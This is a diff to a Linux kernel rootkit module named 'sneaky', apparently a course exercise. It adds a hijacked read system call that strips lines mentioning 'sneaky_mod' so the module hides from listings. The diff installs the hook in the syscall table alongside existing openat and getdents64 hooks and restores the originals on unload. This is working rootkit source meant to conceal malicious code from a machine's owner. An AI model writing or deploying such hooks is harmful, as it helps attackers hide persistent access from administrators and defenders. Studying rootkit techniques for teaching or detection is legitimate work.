@@ -59,6 +59,25 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return n;
 }
 
+asmlinkage int (*original_read)(struct pt_regs * regs);
+
+asmlinkage int sneaky_read(struct pt_regs * regs){
+  int n = original_read(regs);
+  char __user * buf = (char *)regs->si;
+
+  char * line = strstr(buf, "sneaky_mod");
+  if(line != NULL){
+    char * end = strchr(line, '\n');
+    if(end != NULL){
+      end += 1;
+      memmove(line, end, (char __user *)(buf + n) - (end));
+      n -= end - line;
+    }
+  }
+
+  return n;
+}
+
 //original readdir function
 asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
@@ -119,6 +138,9 @@ static int initialize_sneaky_module(void)
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
 
+   original_read = (void *)sys_call_table[__NR_read];
+   sys_call_table[__NR_read] = (unsigned long)sneaky_read;
+
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -137,6 +159,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
